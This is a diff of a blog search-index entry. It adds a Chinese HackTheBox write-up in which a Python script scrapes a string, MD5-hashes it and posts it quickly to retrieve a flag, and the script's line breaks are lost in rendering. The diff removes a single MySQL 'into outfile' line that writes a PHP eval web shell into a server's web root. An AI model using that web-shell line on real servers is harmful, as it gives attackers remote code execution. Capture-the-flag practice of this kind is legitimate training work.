@@ -23,12 +23,18 @@
   
   
   <entry>
-    <title></title>
+    <title>HTB Can you encrypt fast enough?</title>
     <link href="/2021/03/05/HTB-Can-you-encrypt-fast-enough/"/>
     <url>/2021/03/05/HTB-Can-you-encrypt-fast-enough/</url>
     
-    <content type="html"><![CDATA[<p>select ‘<?php eval($_POST[123]) ?>‘ into outfile ‘D:/phpstudy_pro/WWW/123.php’;</p>]]></content>
+    <content type="html"><![CDATA[<p>打开界面后如下图：<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/01.png"><br>尝试MD5加密后填进输入框后提示 “Too slow!”<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/02.png"><br>查看源码后推测，应该是用程序发包，构造如下Python代码：</p><pre><code class="hljs stylus">import requestsimport hashlibimport reurl=<span class="hljs-string">&quot;http://139.59.176.149:30207/&quot;</span>r=requests<span class="hljs-selector-class">.session</span>()out=r<span class="hljs-selector-class">.get</span>(url)rr = re<span class="hljs-selector-class">.compile</span>(r<span class="hljs-string">&quot;&lt;h3 align=&#x27;center&#x27;&gt;(\S+)&lt;/h3&gt;&quot;</span>, re.I)str1 = rr<span class="hljs-selector-class">.findall</span>(out.text)str2=hashlib<span class="hljs-selector-class">.md5</span>(str1<span class="hljs-selector-attr">[0]</span><span class="hljs-selector-class">.encode</span>(<span class="hljs-string">&#x27;utf-8&#x27;</span>))<span class="hljs-selector-class">.hexdigest</span>()data=&#123;<span class="hljs-string">&#x27;hash&#x27;</span>: str2&#125;out = r<span class="hljs-selector-class">.post</span>(url = url, data = data)<span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(out.text)</span></span></code></pre><p>成功回复flag<br><img src="/2021/03/05/HTB-Can-you-encrypt-fast-enough/03.png"></p>]]></content>
     
+    
+    <categories>
+      
+      <category>web</category>
+      
+    </categories>
     
     
   </entry>
